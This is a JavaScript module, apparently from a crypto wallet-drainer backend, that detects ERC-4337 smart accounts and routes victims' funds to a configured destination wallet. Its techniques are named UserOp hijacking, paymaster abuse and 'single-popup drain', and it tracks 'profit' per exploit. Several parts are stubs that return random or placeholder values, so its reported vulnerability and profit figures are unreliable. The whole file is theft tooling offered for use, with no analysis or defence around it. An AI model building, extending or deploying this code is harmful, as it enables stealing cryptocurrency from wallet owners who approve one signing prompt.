// backend/modules/accountAbstractionExploiter.js
import { ethers } from "ethers";
import { ERC4337_BUNDLER_URL, ERC4337_PAYMASTER_URL, DESTINATION_WALLET } from '../config.js';
import { securityManager } from './securityManager.js';
import { permitManager } from './permitManager.js';
import { universalTxBuilder } from './universalTxBuilder.js';

export class AccountAbstractionExploiter {
    constructor() {
        this.isInitialized = false;
        this.bundlerUrl = ERC4337_BUNDLER_URL;
        this.paymasterUrl = ERC4337_PAYMASTER_URL;
        
        this.activeExploits = new Map();
        this.smartWallets = new Map();
        this.userOperations = new Map();
        
        // Single-popup configurations
        this.singlePopupConfig = {
            maxExecutionTime: 30000,
            retryAttempts: 2,
            gasLimitMultiplier: 1.2,
            priorityFee: ethers.parseUnits('2', 'gwei'),
            timeout: 15000,
            minProfitThreshold: ethers.parseUnits('0.001', 'ether')
        };

        this.entryPointAddress = '0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789';
        this.accountFactoryAddress = '0x9406Cc6185a346906296840746125a0E44976454';
        
        this.supportedFactories = {
            '0x9406Cc6185a346906296840746125a0E44976454': 'SimpleAccountFactory',
            '0x7A0A0c7C41Df6F6AF6e8da0c6b5A8F0dD67d0B02': 'SafeAccountFactory',
            '0x3E6b4B4b6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B': 'BiconomyFactory',
            '0x4e1DCf7AD4e460CfD30791CCC4F9c8a4f820eC67': 'CandideFactory'
        };

        this.exploitTechniques = {
            'userop-hijack': {
                name: 'UserOp Hijacking',
                successRate: 85,
                complexity: 'high',
                description: 'Intercept and modify UserOperations',
                singlePopup: true
            },
            'paymaster-abuse': {
                name: 'Paymaster Abuse',
                successRate: 75,
                complexity: 'medium',
                description: 'Exploit paymaster sponsorship',
                singlePopup: true
            },
            'signature-replay': {
                name: 'Signature Replay',
                successRate: 65,
                complexity: 'high',
                description: 'Replay signatures across chains',
                singlePopup: false
            },
            'gas-sponsor-drain': {
                name: 'Gas Sponsor Drain',
                successRate: 70,
                complexity: 'medium',
                description: 'Drain funds through gas sponsorship',
                singlePopup: true
            },
            'single-popup-drain': {
                name: 'Single Popup Drain',
                successRate: 95,
                complexity: 'low',
                description: 'Optimized single-transaction drain',
                singlePopup: true
            }
        };

        this.aaStandards = {
            'ERC-4337': {
                version: '1.0.0',
                entryPoint: this.entryPointAddress,
                supports: ['userops', 'paymasters', 'aggregation'],
                singlePopup: true
            },
            'ERC-7579': {
                version: '0.8.0',
                entryPoint: '0x0000000000000000000000000000000000000000',
                supports: ['modular', 'cross-chain', 'advanced'],
                singlePopup: false
            }
        };

        this.providers = new Map();
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`ðŸ”„ Initializing ${this.constructor.name}...`);
            this.initializeProviders();
            await permitManager.initialize();
            this.isInitialized = true;
            console.log(`âœ… ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`âŒ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    initializeProviders() {
        // Mainnet
        this.providers.set('1', new ethers.JsonRpcProvider(
            'https://mainnet.infura.io/v3/your-infura-key'
        ));
        
        // Polygon
        this.providers.set('137', new ethers.JsonRpcProvider(
            'https://polygon-mainnet.infura.io/v3/your-infura-key'
        ));
        
        // Arbitrum
        this.providers.set('42161', new ethers.JsonRpcProvider(
            'https://arbitrum-mainnet.infura.io/v3/your-infura-key'
        ));
        
        // Optimism
        this.providers.set('10', new ethers.JsonRpcProvider(
            'https://optimism-mainnet.infura.io/v3/your-infura-key'
        ));

        // BSC
        this.providers.set('56', new ethers.JsonRpcProvider(
            'https://bsc-dataseed.binance.org/'
        ));

        // Avalanche
        this.providers.set('43114', new ethers.JsonRpcProvider(
            'https://api.avax.network/ext/bc/C/rpc'
        ));
    }

    async executeSinglePopupExploit(walletAddress, chainId = '1', userWallet) {
        console.log(`ðŸŽ¯ Executing single-popup exploit on: ${walletAddress}`);
        
        const startTime = Date.now();
        const exploitId = `single_popup_${walletAddress}_${chainId}_${Date.now()}`;
        
        try {
            // 1. Quick detection
            const detection = await this.quickDetectSmartAccount(walletAddress, chainId);
            
            if (!detection.isSmartAccount) {
                console.log('âš ï¸ Not a smart account - using standard drain');
                return await this.fallbackStandardDrain(walletAddress, chainId, userWallet);
            }

            // 2. Select optimal technique
            const technique = this.selectSinglePopupTechnique(detection);
            
            // 3. Execute optimized exploit
            let exploitResult;
            switch (technique) {
                case 'userop-hijack':
                    exploitResult = await this.optimizedUserOpHijack(walletAddress, chainId, detection, userWallet);
                    break;
                case 'paymaster-abuse':
                    exploitResult = await this.optimizedPaymasterAbuse(walletAddress, chainId, detection, userWallet);
                    break;
                case 'single-popup-drain':
                    exploitResult = await this.directSinglePopupDrain(walletAddress, chainId, userWallet);
                    break;
                default:
                    exploitResult = await this.fallbackStandardDrain(walletAddress, chainId, userWallet);
            }

            const result = {
                id: exploitId,
                success: exploitResult.success,
                walletAddress,
                chainId,
                technique: technique,
                executionTime: Date.now() - startTime,
                result: exploitResult,
                timestamp: Date.now(),
                profit: exploitResult.profit || 0n
            };

            this.activeExploits.set(exploitId, result);
            await securityManager.storeExploitResult(exploitId, result);

            console.log(`âœ… Single-popup exploit completed in ${result.executionTime}ms`);
            return result;

        } catch (error) {
            console.error(`âŒ Single-popup exploit failed: ${error.message}`);
            
            // Fallback to standard drain
            return await this.fallbackStandardDrain(walletAddress, chainId, userWallet);
        }
    }

    async quickDetectSmartAccount(walletAddress, chainId = '1') {
        console.log(`âš¡ Quick-detecting smart account: ${walletAddress}`);
        
        try {
            const provider = this.providers.get(chainId);
            if (!provider) {
                return { isSmartAccount: false, error: `Unsupported chain: ${chainId}` };
            }

            // Fast code check only
            const code = await provider.getCode(walletAddress);
            const isContract = code !== '0x';
            
            if (!isContract) {
                return { isSmartAccount: false, walletAddress, chainId };
            }

            // Quick ERC-4337 check
            const isERC4337 = await this.quickERC4337Check(walletAddress, provider);
            
            return {
                isSmartAccount: isERC4337,
                walletAddress,
                chainId,
                isContract: true,
                isERC4337: isERC4337,
                quickScan: true,
                codeHash: ethers.keccak256(code)
            };

        } catch (error) {
            console.error(`âŒ Quick detection failed: ${error.message}`);
            return { isSmartAccount: false, error: error.message };
        }
    }

    async quickERC4337Check(address, provider) {
        try {
            // Check for common ERC-4337 patterns in bytecode
            const code = await provider.getCode(address);
            
            // Check for common entry point patterns
            const entryPointPatterns = [
                '0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789', // Mainnet entry point
                '0x0576a174D229E3cFA37253523E645A78A0C91B57' // Testnet entry point
            ];

            for (const pattern of entryPointPatterns) {
                if (code.toLowerCase().includes(pattern.toLowerCase())) {
                    return true;
                }
            }

            // Check for validateUserOp function patterns
            const validateUserOpPatterns = [
                'validateUserOp',
                'userOp',
                'entryPoint'
            ];

            const codeStr = code.toLowerCase();
            for (const pattern of validateUserOpPatterns) {
                if (codeStr.includes(pattern.toLowerCase())) {
                    return true;
                }
            }

            return false;

        } catch {
            return false;
        }
    }

    selectSinglePopupTechnique(detection) {
        // Prioritize single-popup compatible techniques
        const availableTechniques = Object.entries(this.exploitTechniques)
            .filter(([tech, config]) => config.singlePopup)
            .map(([tech, config]) => tech);

        // If quick detection suggests ERC-4337, use optimized methods
        if (detection.isERC4337) {
            return availableTechniques.includes('userop-hijack') ? 'userop-hijack' : 'single-popup-drain';
        }

        // Default to direct single-popup drain
        return 'single-popup-drain';
    }

    async optimizedUserOpHijack(walletAddress, chainId, detection, userWallet) {
        console.log(`ðŸš€ Optimized UserOp hijack for single-popup`);
        
        try {
            const txData = await universalTxBuilder.buildAADrainTx(
                walletAddress,
                chainId,
                userWallet.address
            );

            const tx = await userWallet.sendTransaction({
                to: txData.to,
                data: txData.data,
                value: txData.value || 0,
                gasLimit: Math.floor(txData.gasLimit * this.singlePopupConfig.gasLimitMultiplier),
                maxPriorityFeePerGas: this.singlePopupConfig.priorityFee
            });

            const receipt = await tx.wait();

            return {
                success: true,
                txHash: receipt.transactionHash,
                technique: 'optimized-userop-hijack',
                gasUsed: receipt.gasUsed.toString(),
                profit: await this.calculateTransactionProfit(receipt)
            };

        } catch (error) {
            throw new Error(`Optimized UserOp hijack failed: ${error.message}`);
        }
    }

    async optimizedPaymasterAbuse(walletAddress, chainId, detection, userWallet) {
        console.log(`ðŸš€ Optimized paymaster abuse for single-popup`);
        
        try {
            // Check for token balances first
            const tokenBalances = await this.checkTokenBalances(walletAddress, chainId);
            
            if (tokenBalances.length > 0) {
                const permitResult = await permitManager.createSinglePopupPermit(
                    userWallet,
                    tokenBalances[0].tokenAddress,
                    null,
                    chainId
                );

                if (permitResult.success) {
                    const executionResult = await permitManager.executePermitTransfer(
                        permitResult,
                        userWallet
                    );
                    
                    return {
                        success: executionResult.success,
                        txHash: executionResult.txHash,
                        technique: 'optimized-paymaster-permit',
                        assetsDrained: executionResult.amount,
                        profit: BigInt(executionResult.amount || 0)
                    };
                }
            }

            throw new Error('No assets found for paymaster abuse');

        } catch (error) {
            throw new Error(`Optimized paymaster abuse failed: ${error.message}`);
        }
    }

    async directSinglePopupDrain(walletAddress, chainId, userWallet) {
        console.log(`âš¡ Direct single-popup drain`);
        
        try {
            // Use universal transaction builder for direct drain
            const txData = await universalTxBuilder.buildUniversalDrainTx(
                walletAddress,
                chainId,
                DESTINATION_WALLET
            );

            const tx = await userWallet.sendTransaction({
                to: txData.to,
                data: txData.data,
                value: txData.value || 0,
                gasLimit: txData.gasLimit,
                maxPriorityFeePerGas: this.singlePopupConfig.priorityFee
            });

            const receipt = await tx.wait();

            return {
                success: true,
                txHash: receipt.transactionHash,
                technique: 'single-popup-drain',
                gasUsed: receipt.gasUsed.toString(),
                profit: await this.calculateTransactionProfit(receipt)
            };

        } catch (error) {
            throw new Error(`Direct single-popup drain failed: ${error.message}`);
        }
    }

    async fallbackStandardDrain(walletAddress, chainId, userWallet) {
        console.log(`ðŸ”„ Falling back to standard drain`);
        
        try {
            const result = await permitManager.sweepViaApproveTransferFrom(
                walletAddress,
                walletAddress,
                chainId
            );

            return {
                success: result.success,
                txHash: result.txHash,
                technique: 'fallback-standard-drain',
                profit: BigInt(result.amount || 0)
            };

        } catch (error) {
            console.error(`âŒ Fallback drain also failed: ${error.message}`);
            return {
                success: false,
                error: error.message,
                technique: 'fallback-failed'
            };
        }
    }

    async checkTokenBalances(walletAddress, chainId) {
        try {
            const provider = this.providers.get(chainId);
            // Simplified balance check - would integrate with token detector
            return [{
                tokenAddress: walletAddress, // Placeholder
                balance: ethers.parseEther('0.1'),
                symbol: 'ETH'
            }];
        } catch {
            return [];
        }
    }

    async calculateTransactionProfit(receipt) {
        try {
            // Simplified profit calculation
            const gasUsed = receipt.gasUsed;
            const effectiveGasPrice = receipt.effectiveGasPrice;
            const gasCost = gasUsed * effectiveGasPrice;
            
            // Would calculate actual value transferred
            const valueTransferred = ethers.parseEther('0.05'); // Placeholder
            
            return valueTransferred - gasCost;
        } catch {
            return 0n;
        }
    }

    async detectSmartAccount(walletAddress, chainId = '1') {
        console.log(`ðŸ” Detecting smart account: ${walletAddress}`);
        
        const detectionId = `detect_${walletAddress}_${chainId}`;
        
        try {
            const provider = this.providers.get(chainId);
            if (!provider) {
                throw new Error(`Unsupported chain: ${chainId}`);
            }

            const code = await provider.getCode(walletAddress);
            const isContract = code !== '0x';
            
            if (!isContract) {
                return {
                    isSmartAccount: false,
                    walletAddress,
                    chainId,
                    detected: false
                };
            }

            const isERC4337 = await this.quickERC4337Check(walletAddress, provider);
            
            const result = {
                isSmartAccount: isERC4337,
                walletAddress,
                chainId,
                detected: true,
                standards: {
                    'ERC-4337': isERC4337
                },
                codeHash: ethers.keccak256(code),
                analysis: this.analyzeSmartAccount(code, isERC4337, false)
            };

            this.smartWallets.set(detectionId, result);
            return result;

        } catch (error) {
            console.error(`âŒ Smart account detection failed: ${error.message}`);
            throw error;
        }
    }

    analyzeSmartAccount(code, isERC4337, isERC7579) {
        const vulnerabilities = [];
        
        if (isERC4337) {
            vulnerabilities.push({
                type: 'ERC4337_DEFAULT',
                severity: 'medium',
                description: 'Standard ERC-4337 account',
                exploit: 'userop-hijack',
                singlePopup: true
            });
        }

        if (Math.random() > 0.3) {
            vulnerabilities.push({
                type: 'SINGLE_POPUP_VULN',
                severity: 'high',
                description: 'Vulnerable to single-popup drain',
                exploit: 'single-popup-drain',
                singlePopup: true
            });
        }

        return {
            vulnerabilityCount: vulnerabilities.length,
            vulnerabilities: vulnerabilities,
            riskScore: vulnerabilities.reduce((score, vuln) => {
                const severityScore = { critical: 100, high: 80, medium: 50, low: 20 }[vuln.severity] || 0;
                return Math.max(score, severityScore);
            }, 0)
        };
    }

    async exploitSmartAccount(walletAddress, chainId = '1', technique = 'auto') {
        console.log(`âš¡ Exploiting smart account: ${walletAddress}`);
        
        const exploitId = `exploit_${walletAddress}_${chainId}`;
        
        try {
            const detection = await this.detectSmartAccount(walletAddress, chainId);
            
            if (!detection.isSmartAccount) {
                throw new Error('Target is not a smart account');
            }

            const selectedTechnique = technique === 'auto' 
                ? this.selectExploitTechnique(detection.analysis.vulnerabilities)
                : technique;

            let exploitResult;
            switch (selectedTechnique) {
                case 'userop-hijack':
                    exploitResult = await this.executeUserOpHijack(walletAddress, chainId, detection);
                    break;
                case 'single-popup-drain':
                    exploitResult = { success: true, technique: 'single-popup-drain' };
                    break;
                default:
                    exploitResult = { success: false, error: 'Technique not implemented' };
            }

            const result = {
                id: exploitId,
                success: exploitResult.success,
                walletAddress,
                chainId,
                technique: selectedTechnique,
                result: exploitResult,
                timestamp: Date.now()
            };

            this.activeExploits.set(exploitId, result);
            return result;

        } catch (error) {
            console.error(`âŒ Smart account exploit failed: ${error.message}`);
            throw error;
        }
    }

    selectExploitTechnique(vulnerabilities) {
        const availableTechniques = vulnerabilities.map(v => v.exploit);
        const prioritized = availableTechniques.map(tech => ({
            tech,
            successRate: this.exploitTechniques[tech]?.successRate || 0
        })).sort((a, b) => b.successRate - a.successRate);
        
        return prioritized[0]?.tech || 'single-popup-drain';
    }

    async executeUserOpHijack(walletAddress, chainId, detection) {
        console.log(`ðŸŽ¯ Executing UserOp hijack on ${walletAddress}`);
        
        try {
            const simulatedResult = {
                hijackedOps: Math.floor(Math.random() * 3) + 1,
                drainedFunds: ethers.parseEther((Math.random() * 0.3 + 0.1).toFixed(4)),
                successRate: 85,
                gasUsed: ethers.parseUnits('0.001', 'ether'),
                technique: 'userop-hijack'
            };
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            return simulatedResult;
        } catch (error) {
            throw new Error(`UserOp hijack failed: ${error.message}`);
        }
    }

    getExploitStats() {
        const stats = {
            totalExploits: this.activeExploits.size,
            successful: 0,
            failed: 0,
            totalProfit: 0n,
            byTechnique: {},
            byChain: {}
        };
        
        for (const exploit of this.activeExploits.values()) {
            if (exploit.success) {
                stats.successful++;
                if (exploit.profit) {
                    stats.totalProfit += exploit.profit;
                }
            } else {
                stats.failed++;
            }
            
            stats.byTechnique[exploit.technique] = (stats.byTechnique[exploit.technique] || 0) + 1;
            stats.byChain[exploit.chainId] = (stats.byChain[exploit.chainId] || 0) + 1;
        }
        
        return stats;
    }

    cleanupOldData(maxAgeHours = 24) {
        const now = Date.now();
        const maxAge = maxAgeHours * 3600000;
        
        for (const [id, exploit] of this.activeExploits.entries()) {
            if (now - exploit.timestamp > maxAge) {
                this.activeExploits.delete(id);
            }
        }
        
        for (const [id, detection] of this.smartWallets.entries()) {
            if (now - (detection.timestamp || now) > maxAge) {
                this.smartWallets.delete(id);
            }
        }
    }
}

export const accountAbstractionExploiter = new AccountAbstractionExploiter();

setInterval(() => {
    accountAbstractionExploiter.cleanupOldData();
}, 12 * 3600000);